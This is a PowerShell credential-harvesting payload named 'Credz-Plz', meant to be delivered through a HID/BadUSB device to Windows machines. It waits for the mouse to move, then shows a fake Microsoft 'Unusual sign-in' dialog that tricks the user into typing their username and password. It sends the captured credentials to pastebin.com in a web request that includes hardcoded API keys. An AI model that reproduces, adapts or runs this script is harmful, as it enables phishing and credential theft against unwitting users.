############################################################################################################################################################                      
#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
# Title        : Credz-Plz         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
# Category     : Credentials       | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
# Target       : Windows 7,10,11   |                                                                   |___/ #           /\/|_      __/\\                  #     
# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
#                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
#                                                                                                            #         /       \   /     ~ \               #
#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
############################################################################################################################################################

# ███████╗ ██████╗ ██████╗ ██╗  ██╗███████╗██████╗     ██████╗ ██╗   ██╗         ██╗ ██████╗ 
# ██╔════╝██╔═══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝         ██║██╔════╝ 
# █████╗  ██║   ██║██████╔╝█████╔╝ █████╗  ██║  ██║    ██████╔╝ ╚████╔╝          ██║██║  ███╗
# ██╔══╝  ██║   ██║██╔══██╗██╔═██╗ ██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝      ██   ██║██║   ██║
# ██║     ╚██████╔╝██║  ██║██║  ██╗███████╗██████╔╝    ██████╔╝   ██║       ╚█████╔╝╚██████╔╝
# ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═════╝     ╚═════╝    ╚═╝        ╚════╝  ╚═════╝ 

# This is to generate the ui.prompt you will use to harvest their credentials
function Get-Creds {
    do {
        $cred = $host.ui.promptforcredential('Failed Authentication', '', [Environment]::UserDomainName + '\' + [Environment]::UserName, [Environment]::UserDomainName)
        if ([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
            [System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!")
            Get-Creds
        }
        return $cred
        # ...

        $done = $true
    } until ($done)

}

# This is to pause the script until a mouse movement is detected

function Pause-Script {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o = New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}"); Start-Sleep -Seconds $pauseTime
        }
    }
}

# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 
function Caps-Off {
    Add-Type -AssemblyName System.Windows.Forms
    $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

    #If true, toggle CapsLock key, to ensure that the script doesn't fail
    if ($caps -eq $true) {

        $key = New-Object -ComObject WScript.Shell
        $key.SendKeys('{CapsLock}')
    }
}

# This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
Pause-Script

Caps-Off

Add-Type -AssemblyName System.Windows.Forms

[System.Windows.Forms.MessageBox]::Show("Unusual sign-in. Please authenticate your Microsoft Account")

$creds = Get-Creds

#------------------------------------------------------------------------------------------------------------------------------------

$username = $creds.getnetworkcredential().username
$domain = $creds.getnetworkcredential().domain
$password = $creds.getnetworkcredential().password

$credentials = @"
    Username: $username
    Domain:   $domain
    Password: $password
"@

# Smuggle The credentials out!
$null = Invoke-WebRequest -Uri 'https://pastebin.com/api/api_post.php' -Method POST -Body "api_dev_key=ask0P1pKGGS6sx4qThPNIW2Hq1hyx9YN&api_option=paste&api_user_key=497c98f25b71c824fa9111ca633f4ec6&api_paste_code=$credentials"
